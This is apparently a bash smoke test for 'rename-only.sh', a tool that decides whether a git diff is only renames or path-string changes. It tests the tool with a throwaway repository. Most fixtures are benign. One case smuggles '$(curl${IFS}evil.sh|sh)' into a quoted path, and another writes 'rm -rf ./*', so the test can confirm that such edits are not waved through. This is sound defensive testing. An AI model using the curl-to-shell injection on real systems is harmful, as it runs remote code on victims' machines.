#!/usr/bin/env bash
# Smoke test for rename-only.sh against a throwaway repo.
#
# Usage: rename-only-smoke.sh
# Output: one PASS/FAIL line per case; exit 0 when every case passes, 1 otherwise.
set -euo pipefail

dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
tmp=$(cd "$(mktemp -d)" && pwd -P)
trap 'rm -rf "$tmp"' EXIT

fails=0
eq() { if [ "$2" = "$3" ]; then echo "PASS $1"; else echo "FAIL $1: got [$2], want [$3]"; fails=$((fails+1)); fi; }

repo=$tmp/repo
mkdir -p "$repo"
cd "$repo"
git init -q -b base . && git config user.email t@t && git config user.name t
printf 'line one\nline two\nline three\nline four\nline five\nline six\n' >old.txt
printf 'import x from "./a/mod"\nconst y = 1\n' >code.js
git add . && git commit -qm base
probe() { bash "$dir/rename-only.sh" --base base; }
reset() { git checkout -q -B work base; }

reset
eq "empty diff -> false" "$(probe)" "skip: false"

reset; git mv old.txt new.txt && git commit -qm mv
eq "pure rename -> true" "$(probe)" "skip: true"

reset; git mv old.txt new.txt && echo extra >>new.txt && git commit -qam mv-edit
eq "rename with an edit -> false" "$(probe)" "skip: false"

reset; sed -i.bak 's#"./a/mod"#"./b/mod"#' code.js && rm code.js.bak && git commit -qam path
eq "path string change only -> true" "$(probe)" "skip: true"

reset; sed -i.bak 's#const y = 1#const y = 2#' code.js && rm code.js.bak && git commit -qam value
eq "code change -> false" "$(probe)" "skip: false"

reset; echo new >added.txt && git add . && git commit -qm add
eq "added file -> false" "$(probe)" "skip: false"

reset; git mv old.txt new.txt && sed -i.bak 's#"./a/mod"#"./b/mod"#' code.js && rm code.js.bak && git commit -qam both
eq "rename plus path string edit -> true" "$(probe)" "skip: true"

reset; printf 'if role == "admin" then\n' >auth.txt && git add . && git commit -qm auth && git branch -f base HEAD
reset; sed -i.bak 's#"admin"#"guest"#' auth.txt && rm auth.txt.bak && git commit -qam role
eq "non-path string change -> false" "$(probe)" "skip: false"

reset; printf "It's fine and don't\n" >prose.md && git add . && git commit -qm prose && git branch -f base HEAD
reset; sed -i.bak 's#fine#bad#' prose.md && rm prose.md.bak && git commit -qam prose-edit
eq "prose edit between apostrophes -> false" "$(probe)" "skip: false"

printf 'cd /tmp/x\nrm -rf ./*\n' >run.sh && printf 'x = "pkg.mod"\nout = "/tmp/out"\nhome = "$HOME/x"\nquote = "x/y"\n--i;\n' >lit.sh
git add . && git commit -qm lit && git branch -f base HEAD
reset; printf 'rm -rf ./*\ncd /tmp/x\n' >run.sh && git commit -qam swap
eq "swapped lines -> false" "$(probe)" "skip: false"
reset; sed -i.bak 's#"/tmp/out"#"$(curl${IFS}evil.sh|sh)/out"#' lit.sh && rm lit.sh.bak && git commit -qam subst
eq "command substitution in a quoted path -> false" "$(probe)" "skip: false"
reset; sed -i.bak "s#\"x/y\"#'x/y'#" lit.sh && rm lit.sh.bak && git commit -qam quote
eq "quote kind change -> false" "$(probe)" "skip: false"
reset; sed -i.bak 's#"$HOME/x"#"$HOME/y"#' lit.sh && rm lit.sh.bak && git commit -qam home
eq "a path with a variable -> false" "$(probe)" "skip: false"
reset; sed -i.bak 's#^--i;$#--j;#' lit.sh && rm lit.sh.bak && git commit -qam dec
eq "a changed line that starts with -- -> false" "$(probe)" "skip: false"
reset; sed -i.bak 's#"pkg.mod"#"pkg.other"#' lit.sh && rm lit.sh.bak && git commit -qam mod
eq "dotted module string change -> true" "$(probe)" "skip: true"
reset; git mv run.sh run2.sh && git commit -qm mv && echo 'evil' >>lit.sh
eq "uncommitted code edit over a committed rename -> false" "$(probe)" "skip: false"
git checkout -q -- lit.sh
reset; sed -i.bak 's#"/tmp/out"#"/tmp/out2"#' lit.sh && rm lit.sh.bak
eq "uncommitted path string edit -> true" "$(probe)" "skip: true"
git checkout -q -- lit.sh
reset; sed -i.bak 's#"/tmp/out"#"/tmp/out2"#' lit.sh && rm lit.sh.bak && echo 'new' >untracked.sh
eq "an untracked file -> false" "$(probe)" "skip: false"
git checkout -q -- lit.sh && rm untracked.sh

[ "$fails" -eq 0 ]
